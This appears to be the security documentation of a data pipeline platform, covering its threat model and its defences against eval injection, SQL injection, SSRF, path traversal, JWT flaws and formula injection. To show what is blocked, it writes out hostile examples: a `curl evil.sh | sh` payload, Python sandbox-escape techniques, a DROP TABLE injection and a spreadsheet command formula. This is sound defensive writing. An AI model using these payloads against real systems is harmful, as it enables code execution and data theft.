# Security

The threat model in one sentence: **a pipeline definition is untrusted input.**

In a large organisation a pipeline file is written by more people than can
deploy the service, reviewed less rigorously than source code, and increasingly
generated by upstream tooling. Everything below follows from treating it that
way.

---

## 1. Expression evaluation — no `eval`

Pipelines need expressions: a calculated column, a business rule, a branch
condition. The obvious implementation is `eval`, and it is a remote code
execution vulnerability one line long:

```yaml
- type: derive
  column: pwned
  expression: "__import__('os').system('curl evil.sh | sh')"
```

`ironflow/expressions.py` parses with `ast` and walks the tree against an
explicit allow-list of node types. Anything else is rejected at **compile**
time, before evaluation.

| Attack | Outcome |
|---|---|
| `__import__("os").system(...)` | rejected: `__import__` is not in the function table |
| `().__class__.__bases__[0].__subclasses__()` | rejected: dunder attribute, at compile time |
| `open("/etc/passwd").read()` | rejected: unknown function |
| `(lambda: 1)()` | rejected: `ast.Lambda` not allowed |
| `[x for x in y]` | rejected: comprehensions not allowed |
| `getattr(str, "upper")` | rejected: absent from the function table |
| `"a" * 10**9` | rejected: text arithmetic guard, then the size cap |
| `2 ** 10000000` | rejected: exponent guard |

Dotted access (`params.force`) is *syntax for a mapping lookup* —
`ast.Attribute` is handled by indexing a `Mapping` and returning `None` for
anything else. `getattr` is never called, so no Python object is reachable.

Limits: expression length (2,000 chars), AST node count (400), result sequence
length (1,000,000). Compiled expressions are cached, so a rule over a million
rows parses once.

**Tested by** `tests/test_expressions.py::TestSandboxEscapes` — 27 real escape
techniques, each asserted to be blocked.

### Text arithmetic is refused

`"12.50" * 2` is valid Python and evaluates to `"12.5012.50"`. Over an uncast
CSV column that is a plausible-looking wrong value that survives into the
warehouse. Arithmetic mixing text and numbers raises instead, routing the record
to the `on_error` policy. String `+` string still concatenates.

## 2. SQL injection

Two kinds of thing reach a statement, each with its own rule.

**Values** — a watermark, a filter argument, every column of every row — are
**always bound parameters**. They never enter the SQL string.

```python
connection.execute(text("SELECT * FROM t WHERE ts > :__watermark__"), params)
```

**Identifiers** — table and column names — cannot be bound by any DB-API, so
they are validated against `^[A-Za-z_][A-Za-z0-9_]{0,62}$` and then quoted for
the dialect.

```yaml
table: "orders; DROP TABLE users--"   # SecurityError at connector setup
```

The one raw fragment accepted is the optional `where` option, which exists
because real pipelines need predicates the model cannot express. It runs through
`assert_no_sql_injection` (rejecting `;`, comments, `UNION`, DDL/DML verbs) —
defence in depth, not the primary control. The primary control is that all
values are bound.

**Tested by** `tests/test_connectors.py::TestSql` and
`tests/test_security.py::TestSqlGuards`, including that a malicious *value*
(`Robert'); DROP TABLE students;--`) is stored verbatim.

## 3. Path traversal

Every filesystem path — source, destination, key file, known-hosts file —
passes through `resolve_within(path, roots)`, which resolves the path (collapsing
`..` **and** following symlinks) and asserts the real target is inside an
allow-listed root.

Checking the string before resolution — the common mistake — is bypassed by a
symlink inside an allowed directory. `Path.resolve()` first is what closes it.

```bash
IRONFLOW_DATA_ROOTS=/srv/data,/mnt/exports
```

Empty roots means unrestricted, which
`Settings.validate_production_hardening()` refuses in production.

Filenames arriving from remote systems (SFTP listings, `Content-Disposition`)
go through `safe_filename`, which strips directory components.

## 4. SSRF

Outbound URLs are validated before every request:

- scheme must be `http`/`https`;
- the host may be restricted to a per-connector `allowed_hosts` list;
- the host must not resolve to a private, loopback, link-local, reserved,
  multicast or unspecified address — checked on the **resolved IP**, not the
  hostname, so `evil.com → 127.0.0.1` is caught;
- credentials embedded in the URL are stripped.

Critically, **every hop is re-validated**:

- redirects are *not* followed automatically. `follow_redirects=False`, and each
  `Location` is resolved and re-checked, bounded to 5 hops. A 302 to
  `169.254.169.254` cannot bypass a check that only ran on the original URL.
- pagination links returned in the response body are re-validated the same way.

`169.254.169.254` is the cloud metadata endpoint. Reaching it is how an
innocuous "ingest this API" integration becomes IAM credential theft.

**Tested by** `tests/test_coverage_gaps.py::TestHttpBehaviour` —
`test_redirect_to_an_internal_address_is_blocked`,
`test_pagination_links_are_revalidated`.

## 5. Secrets

Pipeline files hold **references**, never values:

| Reference | Resolution |
|---|---|
| `env:PGPASSWORD` | process environment |
| `file:/run/secrets/db` | file contents (Docker/Kubernetes secrets) |
| `enc:ironflow:v1:…` | decrypted with the platform key |
| `literal:…` | explicit escape hatch; warns, and is refusable by policy |

Resolved values are wrapped in `SecretStr`:

```python
>>> secret = resolver.resolve("env:PGPASSWORD")
>>> print(secret)         # ***
>>> f"{secret}"           # '***'
>>> repr(secret)          # SecretStr(source='env:PGPASSWORD', value='***')
>>> secret.reveal()       # the only way out - and greppable in review
```

It is deliberately **not** a `str` subclass: inheriting from `str` leaks the
value through every implicit conversion.

### Encryption

Fernet (AES-128-CBC + HMAC-SHA256) — authenticated, versioned, carries its own
IV. Passphrase-derived keys use scrypt (N=2¹⁵, r=8, p=1). Salts are random per
operation, so the same plaintext never encrypts to the same bytes.

Keys come from the environment or a permission-checked key file, never from the
pipeline YAML. `CryptoService.from_env()` raises rather than falling back to a
default — a silent fallback would encrypt production secrets with a key that is
in the source tree.

Decryption failure is deliberately vague: distinguishing "wrong key" from
"tampered ciphertext" hands an attacker an oracle.

```bash
ironflow secrets generate-key
```

```bash
ironflow secrets encrypt        # prompts, so the plaintext misses shell history
```

## 6. PII

Three distinct operations, often conflated:

| Transformation | Reversible | Joinable | Use for |
|---|---|---|---|
| `mask_pii` | no | no | non-production environments, support tooling |
| `hash_columns` | no | **yes** | analytics that must join on a person |
| `encrypt_columns` | yes (with the key) | no | fields an operator must occasionally read |

All three run **before** the load, so plaintext never reaches the destination.

`hash_columns` without a `key` is a plain digest. For a low-entropy input — an
email address, a phone number, a national id — that is trivially reversed by
enumeration, so a keyed HMAC is strongly recommended and the connector warns once
per run when the key is missing.

`ironflow pipeline validate` runs a conservative PII detector over a sample and
reports columns that look like email addresses, card numbers (Luhn-checked), IPs
or phone numbers, so undeclared PII surfaces before the first production run.

## 7. Log and report redaction

Three layers, because one is never enough:

1. `SecretStr` renders as `***`.
2. `RedactionFilter` on every log handler scrubs secret-looking keys from record
   extras and rewrites credentials embedded in URLs — so even a developer
   logging a raw DSN does not put the password on disk.
3. `redact_mapping` runs over every report, audit entry and API error payload.

Booleans and numbers are never redacted: blanking
`allow_literal_secrets: false` hides a policy flag an operator needs to see and
protects nothing.

HTML reports and the dashboard escape every interpolated value. Run data
contains error messages that contain source data, so both are XSS sinks
otherwise.

## 8. Authentication and authorisation

The API uses HS256 bearer tokens verified by `verify_token`, which does the three
things CVE reports show implementations getting wrong:

1. the `alg` header is checked against an allow-list **before** verification, so
   `alg: none` and RS256/HS256 confusion are impossible;
2. the signature is compared with `hmac.compare_digest`;
3. `exp`, `nbf`, `iss` and `aud` are all enforced, with bounded clock skew.

`issue_token` and `verify_token` additionally refuse an empty signing secret, so
a caller that bypasses `Settings` cannot reintroduce the unkeyed case.

RBAC is least-privilege by default:

| Role | Can |
|---|---|
| `viewer` | read pipelines, run history, metrics |
| `operator` | + run, retry, schedule |
| `engineer` | + write pipeline definitions, read the audit trail |
| `admin` | + manage secrets |

Nothing grants `secret:read` except `admin`. Principals can additionally be
scoped to pipeline-name patterns, so a team gets `pipeline:run` on `sales_*`
without gaining it everywhere.

The CLI runs as the OS user: anyone who can run the binary already has the
host's credentials, so a second factor there would be theatre. The audit trail
records *who* ran the command.

## 10. Spreadsheet formula injection

A CSV or XLSX cell beginning `=`, `+`, `-` or `@` is executed as a formula when
opened. `=cmd|' /c calc'!A1` in an exported customer name is remote code
execution on the analyst's laptop. Both writers prefix such values with an
apostrophe.

## 11. Transport security

- TLS verification is on by default and **cannot** be disabled in a production
  environment.
- SFTP defaults to `RejectPolicy` with a known-hosts file. `paramiko`'s
  `AutoAddPolicy` — which most examples use — accepts any key on first contact,
  making the connection unauthenticated from an attacker's perspective.
  Relaxing it is refused in production.
- FTP defaults to `FTP_TLS` **with `prot_p()`**, so the data channel is encrypted
  too, not only the control channel. Plain FTP is refused in production.
- PostgreSQL connections request `sslmode=require` by default.

## 12. Audit trail

Privileged actions append to a SHA-256 hash chain: each entry stores
`hash(previous_hash || canonical_payload)`. Editing or deleting any entry breaks
every subsequent link.

```bash
ironflow state audit --verify
```

This makes tampering **detectable**, not impossible — which is what the control
actually asks for. Preventing it requires shipping entries off-host, which is
why `AuditLog` also accepts a sink callable.

Payloads are redacted before hashing, so the audit trail never becomes a
secrets store. A write failure is logged at ERROR and never raises: auditing
must not be able to fail an otherwise healthy load.

## 13. Fail closed in production

```bash
ironflow config check
```

One rule is not conditional on the environment: **whenever `auth_enabled` is
true, `jwt_secret` must be at least 32 characters**, in `local` just as in
`production`. HMAC with an empty key is still a valid HMAC, so an unkeyed
deployment verifies an `admin` token the attacker signed themselves - while the
operator believes the API is protected. `Settings` refuses to construct at all in
that state, so the process never reaches the point of serving a request.

With `IRONFLOW_ENVIRONMENT=production` the platform additionally refuses to start
unless:

- `auth_enabled` is true;
- `encryption_key` is set;
- `allow_literal_secrets` is false;
- `allow_private_network` is false;
- `data_roots` confines connectors to explicit directories;
- `http_verify_tls` is on;
- `audit_enabled` is true;
- the state database is not SQLite.

All problems are reported at once, not one per attempt. `create_app` calls
`assert_production_hardening()`, and `ironflow serve` refuses to serve an
unauthenticated API in production.

## Supply chain

- `scripts/check_secrets.py` runs pre-commit and in CI, refusing DSNs with
  inline passwords, AWS keys, private key blocks, Slack webhooks, GitHub tokens
  and assigned secret literals. It reports the number of files scanned, because
  "clean" after scanning nothing is not clean.
- `pip-audit` runs in CI against the dependency tree.
- ruff's bandit rules (`S`) run over the whole codebase on every commit.
- The container image is multi-stage: no compilers in the runtime, unprivileged
  user, `no-new-privileges`, all capabilities dropped.
